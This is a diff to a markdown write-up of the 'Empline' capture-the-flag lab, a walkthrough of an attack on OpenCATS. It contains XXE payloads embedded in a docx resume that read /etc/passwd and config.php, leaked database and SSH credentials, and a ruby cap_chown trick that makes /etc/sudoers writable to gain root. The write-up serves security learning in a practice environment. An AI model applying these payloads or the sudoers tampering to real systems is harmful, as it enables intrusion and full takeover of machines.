@@ -1,26 +1,25 @@
 ---
 sticker: emoji//1fae5
 ---
+# ENUMERATION
+---
 
-# EMPLINE
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 | 3306 | MYSQL   |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 Let's add `empline.thm` to our `/etc/hosts` file:
 
@@ -28,7 +27,8 @@ Let's add `empline.thm` to our `/etc/hosts` file:
 echo 'IP empline.thm' | sudo tee -a /etc/hosts
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430153941.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430153941.png)
 
 Nothing weird on the main page, source code is normal too, let's proceed to fuzz for directories and subdomains:
 
@@ -65,6 +65,7 @@ javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration:
 
 Nothing too interesting, let's fuzz subdomains then:
 
+
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.246.235 -H "Host: FUZZ.empline.thm" -mc 200,301,302 -fs 14058 -t 100 -ic -c
 
@@ -94,13 +95,14 @@ job                     [Status: 200, Size: 3671, Words: 209, Lines: 102, Durati
 www.job                 [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 175ms]
 ```
 
-We can add to `/etc/hosts` and check them out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430154133.png)
+We can add  to `/etc/hosts` and check them out:
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430154133.png)
 
 There is something called `opencats`, we got a login page, if we check source code we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430154325.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430154325.png)
 
 I tried these credentials but they didn't work, let's fuzz this subdomain to check if it got anything interesting:
 
@@ -155,7 +157,7 @@ ci                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration:
 
 Well there's a lot of stuff we can check, let's do it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430154635.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430154635.png)
 
 On the `xml` directory, we can find this:
 
@@ -191,31 +193,35 @@ http://job.empline.thm/careers/?p=showJob&ID=1&ref=indeed
 
 We can maybe modify any of the parameters, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430154748.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430154748.png)
 
 If we change the `id` to 2, this happens:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430154822.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430154822.png)
 
 It redirect us back to the `?careers&&p=showAll` url, but, the interesting part on here is the `Apply to Position` stuff, let's check it out, in some case, it may contain some sort of section in which we can upload either a CV or any other stuff:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430155138.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430155138.png)
 
 We can search any vulnerability regarding the `opencats career` section:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430161422.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430161422.png)
 
 Seems like we are dealing with a `XXE`, let's proceed to exploitation.
 
-## EXPLOITATION
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430161515.png)
+
+# EXPLOITATION
+---
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430161515.png)
 
 We can read system files exploiting the `XXE` in the following way, let's start by creating a python script which creates a simple document:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430161742.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430161742.png)
 
 ```python
 from docx import Document
@@ -233,11 +239,11 @@ pip install python-docx
 
 Now we need to do this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430162215.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430162215.png)
 
 Let's unzip it and add the `XXE` code:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430162255.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430162255.png)
 
 Now, we need to copy the payload and change the `Reginald Dodd` stuff to `&test;`:
 
@@ -245,9 +251,9 @@ Now, we need to copy the payload and change the `Reginald Dodd` stuff to `&test;
 <!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430162458.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430162458.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430162445.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430162445.png)
 
 Once we do the modifications, we need to zip it again, let's do:
 
@@ -257,7 +263,8 @@ zip resume.docx word/document.xml
 
 Now, let's upload the file:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430162629.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430162629.png)
 
 There we go, as we can see, we are able to read `/etc/passwd`, let's modify the contents to read `config.php`, we need to unzip the `resume.docx` again, and change the payload to this one:
 
@@ -265,7 +272,7 @@ There we go, as we can see, we are able to read `/etc/passwd`, let's modify the 
 <!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430163216.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430163216.png)
 
 Let's zip it again:
 
@@ -275,11 +282,14 @@ zip resume.docx word/document.xml
 
 If we upload it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430163726.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430163726.png)
+
 
 Let's decode the contents and save them to a file, now, we can check the `config.php` file:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430163822.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430163822.png)
 
 We got credentials for the mysql port:
 
@@ -293,38 +303,43 @@ ng6pUFvsGNtw
 
 At the `user` table on the `opencats` database, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430164346.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430164346.png)
 
 We got a hash for the George user, this user was found when we read the `/etc/passwd` file, since it got a console, we can decode the hash and get a session on ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430164451.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430164451.png)
 
 ```
 george:pretonnevippasempre
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430164529.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430164529.png)
+
 
 There we go, let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 ```
 george@empline:~$ cat user.txt
 91cb89c70aa2e5ce0e0116dab099078e
 ```
 
+
 Let's use linpeas to check any PE vector:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430164919.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430164919.png)
 
 `Ruby` has the `cap_chown` capability set, we can do the following:
 
-1. Create a Ruby Script to Change Ownership of `/etc/sudoers`
+1. Create a Ruby Script to Change Ownership of `/etc/sudoers`
 
-Create a file named `exploit.rb` with the following content:
+Create a file named `exploit.rb` with the following content:
 
 ```rb
 File.chown(Process.uid, Process.gid, "/etc/sudoers")
@@ -336,7 +351,7 @@ File.chown(Process.uid, Process.gid, "/etc/sudoers")
 /usr/local/bin/ruby exploit.rb
 ```
 
-3. Modify `/etc/sudoers`:
+3. Modify `/etc/sudoers`: 
 
 ```
 chmod 640 /etc/sudoers
@@ -355,7 +370,8 @@ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 sudo su -
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430170035.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430170035.png)
 
 There we go, let's read final flag and finish the CTF:
 
@@ -364,4 +380,7 @@ root@empline:~# cat /root/root.txt
 74fea7cd0556e9c6f22e6f54bc68f5d5
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250430170111.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250430170111.png)
+
+
